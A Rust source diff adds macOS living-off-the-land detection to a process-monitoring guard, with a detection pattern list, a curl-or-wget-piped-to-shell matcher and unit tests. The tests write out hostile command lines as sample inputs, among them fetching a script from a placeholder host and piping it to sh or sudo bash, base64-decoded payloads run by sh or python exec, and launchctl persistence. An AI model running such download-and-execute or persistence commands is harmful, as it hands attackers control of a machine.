@@ -66,6 +66,81 @@ pub fn match_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
         .find(|pattern| normalized.contains(pattern))
 }
 
+pub const MACOS_LOTL_PROCESSES: &[&str] = &["zsh", "bash", "sh", "osascript", "curl", "python3"];
+
+pub const MACOS_LOTL_PATTERNS: &[&str] = &[
+    "base64 -d",
+    "base64 --decode",
+    "b64decode",
+    "osascript -e",
+    "launchctl load",
+    "chmod +x /tmp/",
+    "chmod +x /private/tmp/",
+];
+
+pub const CURL_PIPE_SHELL: &str = "curl | sh";
+
+/// `curl ... | [sudo] sh|bash|zsh` within one command line (download-and-execute).
+fn curl_piped_to_shell(normalized: &str) -> bool {
+    let stages: Vec<&str> = normalized.split(" | ").collect();
+    let is_fetcher = |token: &str| {
+        let tool = token.rsplit('/').next().unwrap_or(token);
+        tool == "curl" || tool == "wget"
+    };
+    let Some(first_fetch) = stages
+        .iter()
+        .position(|stage| stage.split(' ').any(is_fetcher))
+    else {
+        return false;
+    };
+    stages[first_fetch + 1..].iter().any(|stage| {
+        let mut tokens = stage.split(' ').filter(|t| !t.is_empty());
+        let mut command = tokens.next();
+        if command == Some("sudo") {
+            command = tokens.next();
+        }
+        command
+            .map(|c| c.rsplit('/').next().unwrap_or(c))
+            .is_some_and(|c| matches!(c, "sh" | "bash" | "zsh"))
+    })
+}
+
+/// macOS counterpart of [`match_lotl`]: shells, osascript, curl and python3 (any 3.x name).
+pub fn match_lotl_macos(process_name: &str, cmdline: &str) -> Option<&'static str> {
+    let name = process_name.to_lowercase();
+    let is_python = name == "python" || name.starts_with("python3");
+    if !is_python && !MACOS_LOTL_PROCESSES.contains(&name.as_str()) {
+        return None;
+    }
+    let unquoted: String = cmdline
+        .chars()
+        .filter(|c| *c != '"' && *c != '\'')
+        .collect::<String>()
+        .replace('|', " | ");
+    let normalized = unquoted
+        .split_whitespace()
+        .collect::<Vec<_>>()
+        .join(" ")
+        .to_lowercase();
+    if curl_piped_to_shell(&normalized) {
+        return Some(CURL_PIPE_SHELL);
+    }
+    MACOS_LOTL_PATTERNS
+        .iter()
+        .copied()
+        .find(|pattern| normalized.contains(pattern))
+}
+
+#[cfg(windows)]
+fn platform_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
+    match_lotl(process_name, cmdline)
+}
+
+#[cfg(target_os = "macos")]
+fn platform_lotl(process_name: &str, cmdline: &str) -> Option<&'static str> {
+    match_lotl_macos(process_name, cmdline)
+}
+
 fn refresh_kind() -> ProcessRefreshKind {
     ProcessRefreshKind::nothing()
         .with_cmd(UpdateKind::OnlyIfNotSet)
@@ -134,7 +209,7 @@ impl ProcessGuard {
         }
         let cmdline = command_line(process);
         let exe = process.exe().map(Path::to_path_buf);
-        if let Some(pattern) = match_lotl(&name, &cmdline) {
+        if let Some(pattern) = platform_lotl(&name, &cmdline) {
             self.respond_lotl(pid, &name, &cmdline, pattern);
             return;
         }
@@ -328,5 +403,75 @@ mod tests {
         );
         assert_eq!(match_lotl("notepad.exe", "notepad -enc x"), None);
         assert_eq!(match_lotl("code.exe", "code --windowstyle hidden"), None);
+    }
+
+    #[test]
+    fn macos_flags_download_and_decode_stagers() {
+        assert_eq!(
+            match_lotl_macos("bash", "bash -c 'curl -fsSL http://x/p.sh | sh'"),
+            Some(CURL_PIPE_SHELL)
+        );
+        assert_eq!(
+            match_lotl_macos("zsh", "zsh -c curl -s http://x|sudo /bin/bash"),
+            Some(CURL_PIPE_SHELL)
+        );
+        assert_eq!(
+            match_lotl_macos("sh", "sh -c echo ZWNobyBoaQ== | base64 -D | sh"),
+            Some("base64 -d")
+        );
+        assert_eq!(
+            match_lotl_macos("osascript", "osascript -e do shell script \"id\""),
+            Some("osascript -e")
+        );
+        assert_eq!(
+            match_lotl_macos(
+                "bash",
+                "bash -c launchctl load ~/Library/LaunchAgents/x.plist"
+            ),
+            Some("launchctl load")
+        );
+        assert_eq!(
+            match_lotl_macos("sh", "sh -c chmod +x /tmp/payload && /tmp/payload"),
+            Some("chmod +x /tmp/")
+        );
+        assert_eq!(
+            match_lotl_macos(
+                "Python3.12",
+                "python3 -c import base64;exec(base64.b64decode('aW1wb3J0IG9z'))"
+            ),
+            Some("b64decode")
+        );
+    }
+
+    #[test]
+    fn macos_ignores_benign_commands_and_other_processes() {
+        assert_eq!(match_lotl_macos("zsh", "zsh -c ls -la | grep foo"), None);
+        assert_eq!(
+            match_lotl_macos(
+                "curl",
+                "curl -fsSL -o setup.pkg https://example.com/setup.pkg"
+            ),
+            None
+        );
+        assert_eq!(
+            match_lotl_macos(
+                "bash",
+                "bash -c curl -s https://x/sums.txt | shasum -a 256 -c"
+            ),
+            None
+        );
+        assert_eq!(
+            match_lotl_macos(
+                "osascript",
+                "osascript - The Nex: ZIP_BOMB (HIGH) /tmp/a.zip"
+            ),
+            None
+        );
+        assert_eq!(match_lotl_macos("Safari", "Safari -e x"), None);
+        assert_eq!(
+            match_lotl_macos("powershell.exe", "powershell -enc x"),
+            None
+        );
+        assert_eq!(match_lotl("zsh", "zsh -c curl x | sh"), None);
     }
 }
